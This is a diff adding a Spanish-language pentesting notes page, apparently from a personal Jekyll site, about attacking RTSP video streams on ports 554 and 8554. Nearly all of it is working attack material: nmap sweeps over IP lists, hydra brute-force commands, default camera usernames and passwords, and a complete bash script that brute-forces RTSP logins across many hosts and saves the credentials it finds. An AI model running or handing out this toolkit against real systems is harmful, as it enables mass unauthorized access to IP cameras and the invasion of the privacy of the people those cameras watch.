@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;a href=&quot;https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html?highlight=rtsp#5548554---pentesting-rtsp&quot;&gt;554,8554 - Pentesting RTSP - HackTricks&lt;/a&gt;&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html?highlight=rtsp#5548554---pentesting-rtsp">554,8554 - Pentesting RTSP - HackTricks</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-p</span> 554 <span class="nt">-iL</span> ips.txt <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/554\/open/ {print $2}'</span> <span class="o">&gt;</span> 554.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-p</span> 8554 <span class="nt">-iL</span> ips.txt <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/8554\/open/ {print $2}'</span> <span class="o">&gt;</span> 8554.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat *554.txt | sort | uniq &gt; rtsp_ips.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> rtsp-<span class="k">*</span> <span class="nt">-p</span> 554,8554 <span class="nt">-iL</span> rtsp_ips.txt <span class="nt">-oN</span> rtsp_targeted.txt <span class="nt">--open</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> root <span class="nt">-P</span> passwords.txt &lt;IP&gt; rtsp
+</code></pre></div></div>
+
+<p>rtsp_users.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin
+Admin
+Administrator
+root
+supervisor
+ubnt
+service
+Dinion
+administrator
+admin1
+</code></pre></div></div>
+
+<p>rtsp_passwords.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin
+9999
+123456
+pass
+camera
+1234
+12345
+fliradmin
+system
+jvc
+meinsm
+root
+4321
+111111
+1111111
+password
+ikwd
+supervisor
+ubnt
+wbox123
+service
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hydra_brute.sh  <span class="nt">-i</span> rtsp_ips.txt <span class="nt">-u</span> rtsp_users.txt <span class="nt">-p</span> rtsp_passwords.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+show_help<span class="o">()</span> <span class="o">{</span>
+  <span class="nb">echo</span> <span class="s2">"Uso: </span><span class="nv">$0</span><span class="s2"> -i &lt;ips.txt&gt; -u &lt;users.txt&gt; -p &lt;passwords.txt&gt; [-o &lt;output.txt&gt;]"</span>
+  <span class="nb">echo</span> <span class="s2">""</span>
+  <span class="nb">echo</span> <span class="s2">"  -i   Archivo con lista de IPs (una por línea)"</span>
+  <span class="nb">echo</span> <span class="s2">"  -u   Archivo con lista de usuarios"</span>
+  <span class="nb">echo</span> <span class="s2">"  -p   Archivo con lista de contraseñas"</span>
+  <span class="nb">echo</span> <span class="s2">"  -o   (Opcional) Archivo de salida (por defecto: hydra_rtsp_results.txt)"</span>
+  <span class="nb">echo</span> <span class="s2">"  -h   Mostrar esta ayuda"</span>
+  <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="c"># Valores por defecto</span>
+<span class="nv">output_file</span><span class="o">=</span><span class="s2">"hydra_rtsp_results.txt"</span>
+
+<span class="c"># Parsear argumentos</span>
+<span class="k">while </span><span class="nb">getopts</span> <span class="s2">":i:u:p:o:h"</span> opt<span class="p">;</span> <span class="k">do
+  case</span> <span class="nv">$opt</span> <span class="k">in
+    </span>i<span class="p">)</span> <span class="nv">input_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$OPTARG</span><span class="s2">"</span> <span class="p">;;</span>
+    u<span class="p">)</span> <span class="nv">user_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$OPTARG</span><span class="s2">"</span> <span class="p">;;</span>
+    p<span class="p">)</span> <span class="nv">pass_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$OPTARG</span><span class="s2">"</span> <span class="p">;;</span>
+    o<span class="p">)</span> <span class="nv">output_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$OPTARG</span><span class="s2">"</span> <span class="p">;;</span>
+    h<span class="p">)</span> show_help <span class="p">;;</span>
+    <span class="se">\?</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"❌ Opción inválida: -</span><span class="nv">$OPTARG</span><span class="s2">"</span> <span class="o">&gt;</span>&amp;2<span class="p">;</span> show_help <span class="p">;;</span>
+    :<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"❌ La opción -</span><span class="nv">$OPTARG</span><span class="s2"> requiere un argumento."</span> <span class="o">&gt;</span>&amp;2<span class="p">;</span> show_help <span class="p">;;</span>
+  <span class="k">esac</span>
+<span class="k">done</span>
+
+<span class="c"># Verificar que se pasaron los argumentos requeridos</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$input_file</span><span class="s2">"</span> <span class="o">||</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$user_file</span><span class="s2">"</span> <span class="o">||</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$pass_file</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+  </span><span class="nb">echo</span> <span class="s2">"❌ Faltan argumentos obligatorios."</span>
+  show_help
+<span class="k">fi</span>
+
+<span class="c"># Comprobar que los archivos existen</span>
+<span class="k">for </span>file <span class="k">in</span> <span class="s2">"</span><span class="nv">$input_file</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$user_file</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$pass_file</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+  if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"❌ Archivo no encontrado: </span><span class="nv">$file</span><span class="s2">"</span>
+    <span class="nb">exit </span>1
+  <span class="k">fi
+done</span>
+
+<span class="c"># Limpiar salida anterior</span>
+<span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$output_file</span><span class="s2">"</span>
+
+<span class="c"># Probar cada IP</span>
+<span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> ip<span class="p">;</span> <span class="k">do
+  </span><span class="nb">echo</span> <span class="s2">"🎯 Probando RTSP en </span><span class="nv">$ip</span><span class="s2">"</span>
+  hydra <span class="nt">-L</span> <span class="s2">"</span><span class="nv">$user_file</span><span class="s2">"</span> <span class="nt">-P</span> <span class="s2">"</span><span class="nv">$pass_file</span><span class="s2">"</span> <span class="s2">"rtsp://</span><span class="nv">$ip</span><span class="s2">"</span> <span class="nt">-f</span> <span class="nt">-t</span> 4 <span class="nt">-o</span> temp_result.txt
+  
+  <span class="k">if </span><span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"login:"</span> temp_result.txt<span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"✅ Credenciales encontradas en </span><span class="nv">$ip</span><span class="s2">"</span>
+    <span class="nb">cat </span>temp_result.txt <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="nv">$output_file</span><span class="s2">"</span>
+  <span class="k">fi
+
+  </span><span class="nb">rm</span> <span class="nt">-f</span> temp_result.txt
+<span class="k">done</span> &lt; <span class="s2">"</span><span class="nv">$input_file</span><span class="s2">"</span>
+
+<span class="nb">echo</span> <span class="s2">"✅ Ataque finalizado. Resultados guardados en </span><span class="nv">$output_file</span><span class="s2">"</span>
+
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
